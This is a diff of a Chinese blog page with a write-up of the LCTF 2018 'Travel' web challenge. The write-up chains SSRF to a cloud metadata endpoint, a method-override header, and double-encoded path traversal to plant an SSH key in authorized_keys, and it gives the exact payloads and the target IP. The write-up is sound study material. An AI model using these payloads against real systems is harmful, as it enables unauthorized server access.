@@ -79,13 +79,13 @@
 
 
 
-<meta name="description" content="0x00 前言来源于lctf2018的一道web题：Travel 0x01 题目源码首先题目给出源码1234567891011121314151617181920212223242526@app.route(&amp;apos;/upload/&amp;lt;filename&amp;gt;&amp;apos;, methods = [&amp;apos;PUT&amp;apos;])def upload_file(filename):">
+<meta name="description" content="0x00 前言来源于lctf2018的一道web题：Travel 0x01 题目源码首先题目给出源码1234567891011121314151617181920212223242526@app.route(&apos;/upload/&amp;lt;filename&amp;gt;&apos;, methods = [&apos;PUT&apos;])def upload_file(filename):    name = request.cooki">
 <meta name="keywords" content="ssrf">
 <meta property="og:type" content="article">
 <meta property="og:title" content="python ssrf+put上传ssh公钥">
 <meta property="og:url" content="http://yoursite.com/2018/11/19/python-ssrf-put上传ssh公钥/index.html">
 <meta property="og:site_name" content="Boogle&#39;s Blogs">
-<meta property="og:description" content="0x00 前言来源于lctf2018的一道web题：Travel 0x01 题目源码首先题目给出源码1234567891011121314151617181920212223242526@app.route(&amp;apos;/upload/&amp;lt;filename&amp;gt;&amp;apos;, methods = [&amp;apos;PUT&amp;apos;])def upload_file(filename):">
+<meta property="og:description" content="0x00 前言来源于lctf2018的一道web题：Travel 0x01 题目源码首先题目给出源码1234567891011121314151617181920212223242526@app.route(&apos;/upload/&amp;lt;filename&amp;gt;&apos;, methods = [&apos;PUT&apos;])def upload_file(filename):    name = request.cooki">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://i.loli.net/2018/11/19/5bf2c77eda015.png">
 <meta property="og:image" content="https://i.loli.net/2018/11/19/5bf2c7ef6a5a2.png">
@@ -94,7 +94,7 @@
 <meta property="og:updated_time" content="2019-02-21T05:33:42.110Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="python ssrf+put上传ssh公钥">
-<meta name="twitter:description" content="0x00 前言来源于lctf2018的一道web题：Travel 0x01 题目源码首先题目给出源码1234567891011121314151617181920212223242526@app.route(&amp;apos;/upload/&amp;lt;filename&amp;gt;&amp;apos;, methods = [&amp;apos;PUT&amp;apos;])def upload_file(filename):">
+<meta name="twitter:description" content="0x00 前言来源于lctf2018的一道web题：Travel 0x01 题目源码首先题目给出源码1234567891011121314151617181920212223242526@app.route(&apos;/upload/&amp;lt;filename&amp;gt;&apos;, methods = [&apos;PUT&apos;])def upload_file(filename):    name = request.cooki">
 <meta name="twitter:image" content="https://i.loli.net/2018/11/19/5bf2c77eda015.png">
 
 
@@ -192,6 +192,26 @@
               <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
             
             Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
           </a>
         </li>
       
@@ -328,19 +348,19 @@
 
       
         <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>来源于lctf2018的一道web题：Travel</p>
-<h2 id="0x01-题目源码"><a href="#0x01-题目源码" class="headerlink" title="0x01 题目源码"></a>0x01 题目源码</h2><p>首先题目给出源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@app.route(&apos;/upload/&lt;filename&gt;&apos;, methods = [&apos;PUT&apos;])</span><br><span class="line">def upload_file(filename):</span><br><span class="line">    name = request.cookies.get(&apos;name&apos;)</span><br><span class="line">    pwd = request.cookies.get(&apos;pwd&apos;)</span><br><span class="line">    if name != &apos;lctf&apos; or pwd != str(uuid.getnode()):</span><br><span class="line">        return &quot;0&quot;</span><br><span class="line">    filename = urllib.unquote(filename)</span><br><span class="line">    with open(os.path.join(app.config[&apos;UPLOAD_FOLDER&apos;], filename), &apos;w&apos;) as f:</span><br><span class="line">        f.write(request.get_data(as_text = True))</span><br><span class="line">        return &quot;1&quot;</span><br><span class="line">    return &quot;0&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;, methods = [&apos;GET&apos;])</span><br><span class="line">def index():</span><br><span class="line">    url = request.args.get(&apos;url&apos;, &apos;&apos;)</span><br><span class="line">    if url == &apos;&apos;:</span><br><span class="line">        return render_template(&apos;index.html&apos;)</span><br><span class="line">    if &quot;http&quot; != url[: 4]:</span><br><span class="line">        return &quot;hacker&quot;</span><br><span class="line">    try:</span><br><span class="line">        response = requests.get(url, timeout = 10)</span><br><span class="line">        response.encoding = &apos;utf-8&apos;</span><br><span class="line">        return response.text</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Something Error&quot;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x01-题目源码"><a href="#0x01-题目源码" class="headerlink" title="0x01 题目源码"></a>0x01 题目源码</h2><p>首先题目给出源码<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">'/upload/&lt;filename&gt;'</span>, methods = [<span class="string">'PUT'</span>])</span><br><span class="line">def upload_file(filename):</span><br><span class="line">    name = request.cookies.<span class="keyword">get</span>(<span class="string">'name'</span>)</span><br><span class="line">    pwd = request.cookies.<span class="keyword">get</span>(<span class="string">'pwd'</span>)</span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">'lctf'</span> or pwd != str(uuid.getnode()):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line">    filename = urllib.unquote(filename)</span><br><span class="line">    with <span class="keyword">open</span>(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename), <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(request.get_data(as_text = True))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"0"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">'/'</span>, methods = [<span class="string">'GET'</span>])</span><br><span class="line">def index():</span><br><span class="line">    url = request.args.<span class="keyword">get</span>(<span class="string">'url'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> url == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"http"</span> != url[: <span class="number">4</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"hacker"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.<span class="keyword">get</span>(url, timeout = <span class="number">10</span>)</span><br><span class="line">        response.encoding = <span class="string">'utf-8'</span></span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line">    except:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Something Error"</span></span><br></pre></td></tr></table></figure></p>
 <h2 id="0x02-题目分析"><a href="#0x02-题目分析" class="headerlink" title="0x02 题目分析"></a>0x02 题目分析</h2><p>可以看到只要<strong>name=’lctf’&amp;&amp;pwd=str(uuid.getnode())</strong>即可登陆成功上传任意文件。<br>而这里需要知道uuid.getnode()也就是网卡地址。正常的话可以读取/sys/class/net/eth0/address来获得。题目是Python + requests库。requests库的底层是urllib，而没有任何扩展的urllib仅支持http和https协议，因此我们没有办法读取任意文件。我们查一查IP，就能发现是腾讯云的机器。既然是云服务商，那么通常就会有一个metadata的API。例如，Amazon EC2，就可以通过 <a href="http://169.254.169.254" target="_blank" rel="noopener">http://169.254.169.254</a> 来获取metadata，而所有基于OpenStack搭建的云服务也都使用这个地址。</p>
-<p>因此，让我们查看<a href="https://cloud.tencent.com/document/product/213/4934" target="_blank" rel="noopener">腾讯云的文档</a>，很容易就能搞出payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.150.86/?url=http://metadata.tencentyun.com/latest/meta-data/mac</span><br></pre></td></tr></table></figure></p>
-<p>得到网卡地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">52:54:00:48:c8:73（hex）-&gt;90520735500403(int)</span><br></pre></td></tr></table></figure></p>
+<p>因此，让我们查看<a href="https://cloud.tencent.com/document/product/213/4934" target="_blank" rel="noopener">腾讯云的文档</a>，很容易就能搞出payload：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">118.25</span>.<span class="number">150.86</span><span class="regexp">/?url=http:/</span><span class="regexp">/metadata.tencentyun.com/</span>latest<span class="regexp">/meta-data/m</span>ac</span><br></pre></td></tr></table></figure></p>
+<p>得到网卡地址<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">52<span class="selector-pseudo">:54</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:48</span><span class="selector-pseudo">:c8</span><span class="selector-pseudo">:73</span>（<span class="selector-tag">hex</span>）<span class="selector-tag">-</span>&gt;90520735500403(<span class="selector-tag">int</span>)</span><br></pre></td></tr></table></figure></p>
 <p>然后在put的时候会出现一个问题</p>
 <p><img src="https://i.loli.net/2018/11/19/5bf2c77eda015.png" alt></p>
 <p>会出现一个405 not allowed<br>而与POST出现的不太一样。<br><img src="https://i.loli.net/2018/11/19/5bf2c7ef6a5a2.png" alt></p>
 <p>那么这里可以确认是Nginx层面上禁止了PUT。Flask对这个问题有解决方案，即X-HTTP-Method-Override头。<br><img src="https://i.loli.net/2018/11/19/5bf2c8afaa11a.png" alt></p>
-<p>这里利用任意文件写+目录穿透上传ssh公钥。<br>在本地生成ssh公钥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root/.ssh/</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa -P &apos;&apos;</span><br></pre></td></tr></table></figure></p>
+<p>这里利用任意文件写+目录穿透上传ssh公钥。<br>在本地生成ssh公钥<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/.ssh/</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa -P <span class="string">''</span></span><br></pre></td></tr></table></figure></p>
 <p>然后将公钥上传到目录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/lctf/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
-<p>这里需要注意到是需要将目录进行两次url编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..%252f..%252f..%252f..%252f..%252f..%252fhome%252flctf%252f.ssh%252fauthorized_keys</span><br></pre></td></tr></table></figure></p>
-<p>然后即可进行登陆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh lctf@118.25.150.86</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/home/</span>lctf<span class="regexp">/.ssh/</span>authorized_keys</span><br></pre></td></tr></table></figure>
+<p>这里需要注意到是需要将目录进行两次url编码<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..<span class="meta">%</span><span class="number">252</span>f..<span class="meta">%</span><span class="number">252</span>f..<span class="meta">%</span><span class="number">252</span>f..<span class="meta">%</span><span class="number">252</span>f..<span class="meta">%</span><span class="number">252</span>f..<span class="meta">%</span><span class="number">252</span>fhome<span class="meta">%</span><span class="number">252</span>flctf<span class="meta">%</span><span class="number">252</span>f.ssh<span class="meta">%</span><span class="number">252</span>fauthorized_keys</span><br></pre></td></tr></table></figure></p>
+<p>然后即可进行登陆<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ssh</span> <span class="selector-tag">lctf</span>@<span class="keyword">118</span>.<span class="keyword">25</span>.<span class="keyword">150</span>.<span class="keyword">86</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://i.loli.net/2018/11/19/5bf2c9d069ee2.png" alt></p>
 
       
@@ -359,7 +379,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/ssrf/" rel="tag"># ssrf</a>
+            <a href="/tags/ssrf/" rel="tag"><i class="fa fa-tag"></i> ssrf</a>
           
         </div>
       
@@ -461,7 +481,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-count">36</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -471,10 +491,10 @@
               
               
               <div class="site-state-item site-state-categories">
-                
+                <a href="/categories/index.html">
                   <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">categories</span>
-                
+                </a>
               </div>
             
 
@@ -482,10 +502,10 @@
               
               
               <div class="site-state-item site-state-tags">
-                
-                  <span class="site-state-item-count">13</span>
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">tags</span>
-                
+                </a>
               </div>
             
 
@@ -536,7 +556,8 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -546,6 +567,11 @@
 </div>
 
 
+  <div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
   <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
 
 
